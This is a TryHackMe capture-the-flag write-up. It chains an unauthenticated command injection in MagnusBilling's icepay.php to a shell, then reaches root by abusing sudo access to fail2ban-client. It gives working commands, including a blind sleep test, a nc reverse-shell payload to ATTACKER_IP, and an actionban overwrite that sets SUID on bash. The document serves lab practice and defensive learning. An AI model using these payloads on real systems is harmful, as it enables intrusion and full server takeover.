---
title: "Billing — Write-up (TryHackMe)"
room: "https://tryhackme.com/room/billing"
difficulty: "Easy"
platform: "TryHackMe"
category: "Web"
---

# Billing — Write-up

> **Summary:** exploit an **unauthenticated Command Injection** in **MagnusBilling 6.0.0.0** to obtain a shell as `asterisk`, then perform **Privilege Escalation** via `sudo` access to `fail2ban-client` to gain root.

---

## Executive summary

- **Initial access:** Unauthenticated command injection in `icepay.php` (`GET democ=`)
- **Access obtained:** shell as `asterisk`
- **Privilege escalation:** `sudo` NOPASSWD for `/usr/bin/fail2ban-client` → overwrite `actionban` → trigger via `banip`
- **Evidence:** blind timing validation + reverse shell + `sudo -l` + Fail2Ban server executing actions as root
- **Flags:** `user.txt` and `root.txt` (redacted)

> **OPSEC note:** IP addresses and flags are masked/redacted for publication.

---

## Attack path (quick view)

1. **Recon:** Nmap identifies `80/tcp` hosting `MagnusBilling` at `/mbilling/`
2. **Enum / Versioning:** browser console metadata confirms `MBilling 6.0.0.0`
3. **Exploit:** command injection at `/mbilling/lib/icepay/icepay.php?democ=...` (blind) → reverse shell
4. **Privesc:** `sudo -l` → `fail2ban-client` NOPASSWD → modify `actionban` → `banip` executes as root → SUID `/bin/bash` → root

---

## Scope and assumptions

- **Bruteforcing:** out of scope (per room note).
- **Goal:** obtain `user.txt` and `root.txt`.
- **Target host:** `TARGET_IP` (e.g., `10.66.x.x`)
- **Attacker host:** `ATTACKER_IP` (e.g., `192.168.x.x`)

---

# Phase 1 — Reconnaissance

## Nmap scanning

```bash
nmap -n -Pn -T4 -p- -sV -sC TARGET_IP
```

**Findings (high level):**

- `22/tcp` — OpenSSH (Debian)
- `80/tcp` — Apache (redirects to `/mbilling/`)
- `3306/tcp` — MariaDB (unauthorized)
- `5038/tcp` — Asterisk Call Manager

This host behaves like a VoIP/telephony hub: **Asterisk** as the backend, **MagnusBilling** as the admin/front-end, and **MariaDB** as storage.

---

## Accessing MagnusBilling and version enumeration

Browsing to `http://TARGET_IP/` redirects to:

- `http://TARGET_IP/mbilling/`

Inspecting the HTML revealed the **ExtJS** bootstrap via a microloader:

```html
<script data-app="66fb43d2-c53a-4317-ab77-8188ac019a5b" id="microloader" type="text/javascript">
  var Ext=Ext||{};Ext.manifest=Ext.manifest||"blue-neptune.json";Ext=Ext||{};....
</script>
```

The application version was then confirmed in real time from the browser console by reading the metadata loaded in memory:

- **name:** `MBilling`
- **version:** `6.0.0.0`

---

# Phase 2 — Exploitation (Initial Access)

## Vulnerability: unauthenticated command injection in `icepay.php`

**High-level description:**  
A **command injection** issue in vulnerable **MagnusBilling 6.x/7.x** instances allows arbitrary command execution via an **unauthenticated** HTTP request by controlling the `democ` parameter at:

- `/mbilling/lib/icepay/icepay.php?democ=...`

The file contains demonstration logic that invokes `exec()` with user-controlled input **without proper sanitization/escaping**. Commands execute with the privileges of the web process (commonly `www-data`; on this host it is `asterisk`).

> **Mitigation:** remove/disable the demo endpoint, restrict access to `/mbilling/` (ACL/VPN), and update to a patched version (vendor fix/commit).

---

## Endpoint validation

First, verify the file exists and responds:

```bash
curl -I "http://TARGET_IP/mbilling/lib/icepay/icepay.php?democ=echo%20test"
```

This confirms `HTTP 200`. Because the response does not reflect command output, I validated execution using a **blind timing** technique.

### Proof (blind): sleep

```bash
time curl -s "http://TARGET_IP/mbilling/lib/icepay/icepay.php?democ=;sleep+5;"
```

A consistent ~5 second delay confirms server-side execution.

**Payload notes:**
- `;` separates shell commands
- `time` measures response duration to confirm execution
- a trailing `;` helps prevent collisions with any server-side concatenation

---

## Reverse shell (RCE → shell as asterisk)

On the attacker machine, start a listener:

```bash
nc -lvnp 443
```

Execute the payload (using `--data-urlencode` to safely encode special characters):

```bash
curl -s -G "http://TARGET_IP/mbilling/lib/icepay/icepay.php" \
  --data-urlencode "democ=;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f;"
```

> **Note:** If `443` is not suitable, use another port (e.g., `4444`) and update both the listener and payload accordingly.

Upon connection:

```text
sh: 0: can't access tty; job control turned off
$
```

---

## Shell stabilization (TTY)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```

---

## User flag

```bash
cd /home/magnus
cat user.txt
THM{[redacted]}
```

---

# Phase 3 — Privilege Escalation

## Privilege enumeration

Current user:

```bash
id
```

Check sudo permissions:

```bash
sudo -l
```

**Critical finding:**
- user `asterisk` can run **without a password**:
  - `(ALL) NOPASSWD: /usr/bin/fail2ban-client`

---

## Why this matters

`fail2ban-client` is a control client. It sends commands to the **fail2ban-server**, which typically runs as **root** to apply firewall rules and execute ban/unban actions.

If we can modify an action command (e.g., `actionban`) and then **trigger** that action, the server will execute our supplied command as **root**.

---

## Fail2Ban abuse: overwrite `actionban` and trigger via `banip`

### 1) List active jails

```bash
sudo fail2ban-client status
```

Example output:

```text
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

### 2) Identify actions for the `asterisk-iptables` jail

```bash
sudo fail2ban-client get asterisk-iptables actions
```

Expected (example):

```text
iptables-allports-ASTERISK
```

### 3) Inspect the default `actionban` command

```bash
sudo fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

Example:

```text
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
```

### 4) Replace `actionban` with an arbitrary command

Here, I replaced it with a command that enables SUID on `/bin/bash`:

```bash
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban "chmod +s /bin/bash"
```

### 5) Trigger execution via `banip`

```bash
sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
```

If successful, `fail2ban-server` executes the new `actionban` as root.

---

## Root shell via SUID bash

```bash
/bin/bash -p
id
```

Expected:

```text
euid=0(root)
```

---

## Root flag

```bash
cd /root
cat root.txt
THM{[redacted]}
```

---

## Cleanup (best practice)

Because SUID on `/bin/bash` is persistent and unsafe, revert it:

```bash
chmod u-s /bin/bash
```

It is also recommended to restore the original Fail2Ban `actionban` (or reload the jail configuration) in controlled lab/test environments.

---

# Conclusion

- **Impact:** full system compromise (root) starting from unauthenticated RCE in MagnusBilling.
- **Attack chain:** vulnerable endpoint → shell as `asterisk` → `sudo` fail2ban-client → root execution via Fail2Ban server → root access.
- **Key lessons:** demo endpoints and overly permissive `sudo` rules create short paths to total compromise.

---

> Written by **Nelson Hirt**
